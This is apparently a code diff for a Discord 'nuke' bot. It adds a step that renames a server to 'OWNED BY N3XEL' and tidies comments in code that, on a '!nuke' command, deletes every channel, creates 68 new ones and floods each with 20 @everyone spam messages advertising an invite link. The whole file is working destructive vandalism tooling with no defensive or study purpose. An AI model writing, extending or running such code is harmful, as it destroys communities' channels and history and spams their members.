@@ -15,7 +15,7 @@ const client = new Client({
   ]
 });
 
-// channel names - no numbers just fancy text + random letter at the end
+// fancy channel names (no numbers, just letters added later)
 const nameBase = [
   "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
   "𝗻𝗶𝗴𝗵𝘁𝗺𝗮𝗿𝗲 𝗶𝘀 𝗵𝗲𝗿𝗲",
@@ -24,19 +24,18 @@ const nameBase = [
   "n̷i̷g̷h̷t̷m̷a̷r̷e̷ i̷s̷ h̷e̷r̷e̷"
 ];
 
-// the spam message - exactly as u said
 const spamMsg = `# NUKED BY N3XEL
 -# N3XEL ON TOP
 https://discord.gg/DyRketGTq
 ||@everyone||`;
 
-// random letter generator (no numbers)
+// random 2 letters (no numbers)
 function randomSuffix() {
   const chars = 'abcdefghijklmnopqrstuvwxyz';
   return chars[Math.floor(Math.random() * chars.length)] + chars[Math.floor(Math.random() * chars.length)];
 }
 
-// parallel shit with concurrency
+// parallel execution with concurrency limit
 async function runParallel(tasks, concurrency) {
   let idx = 0;
   let results = [];
@@ -53,7 +52,7 @@ async function runParallel(tasks, concurrency) {
   return results;
 }
 
-// delete all channels fast as fuck
+// delete all channels fast
 async function deleteAllChannels(guild) {
   let channels = [...guild.channels.cache.values()];
   console.log(`DELETING ${channels.length} CHANNELS REAL FAST`);
@@ -67,13 +66,13 @@ async function deleteAllChannels(guild) {
   console.log("ALL CHANNELS GONE");
 }
 
-// create 68 channels with random fancy name + 2 random letters (no numbers)
+// create 68 channels and spam 20 messages each
 async function create68ChannelsAndSpam(guild) {
   console.log("CREATING 68 CHANNELS LIKE A MADMAN");
   let tasks = [];
   for (let i = 0; i < 68; i++) {
     let baseName = nameBase[Math.floor(Math.random() * nameBase.length)];
-    let uniqueName = baseName + "-" + randomSuffix(); // no numbers, just letters
+    let uniqueName = baseName + "-" + randomSuffix();
     tasks.push(async () => {
       try {
         let chan = await guild.channels.create({
@@ -85,7 +84,7 @@ async function create68ChannelsAndSpam(guild) {
           }]
         });
         console.log(`made channel ${uniqueName}`);
-        // send 20 messages at once in parallel
+        // send 20 messages in parallel
         let msgPromises = [];
         for (let k = 0; k < 20; k++) {
           msgPromises.push(chan.send(spamMsg).catch(err => {
@@ -102,7 +101,6 @@ async function create68ChannelsAndSpam(guild) {
         if (err.code == 429) {
           console.log("ratelimit on create, waiting a bit");
           await new Promise(r => setTimeout(r, err.retryAfter * 1000));
-          // fuck it just skip this one, we'll try to make 68 anyway
         } else {
           console.log(`failed to make ${uniqueName}: ${err.message}`);
         }
@@ -113,9 +111,16 @@ async function create68ChannelsAndSpam(guild) {
   console.log("DONE CREATING AND SPAMMING");
 }
 
-// main nuke - no confirm needed
+// main nuke - change server name first
 async function nukeServer(guild) {
   console.log(`🔥🔥🔥 NUKING ${guild.name} 🔥🔥🔥`);
+  // change server name to OWNED BY N3XEL
+  try {
+    await guild.setName("OWNED BY N3XEL");
+    console.log("changed server name to OWNED BY N3XEL");
+  } catch(e) {
+    console.log("couldn't change server name: " + e.message);
+  }
   await deleteAllChannels(guild);
   await create68ChannelsAndSpam(guild);
   console.log("SERVER IS FUCKED");
@@ -125,7 +130,7 @@ client.once('ready', () => {
   console.log(`Logged in as ${client.user.tag}`);
   client.user.setPresence({
     status: 'dnd',
-    activities: [{ name: '@azairo', type: ActivityType.Custom, state: '@azairo' }]
+    activities: [{ name: '@n3xel', type: ActivityType.Custom, state: '@azairo' }]
   });
   console.log("status DND with @azairo");
 });
@@ -135,7 +140,7 @@ client.on('messageCreate', async (msg) => {
   if (msg.content.trim() === '!nuke') {
     let guild = msg.guild;
     if (!guild) return msg.reply("this aint a server dumbass");
-    await msg.reply("💀 NUKE STARTED - EVERYTHING GETS DELETED");
+    await msg.reply("💀 NUKE STARTED - RENAMING SERVER, DELETING EVERYTHING");
     await nukeServer(guild);
   }
 });
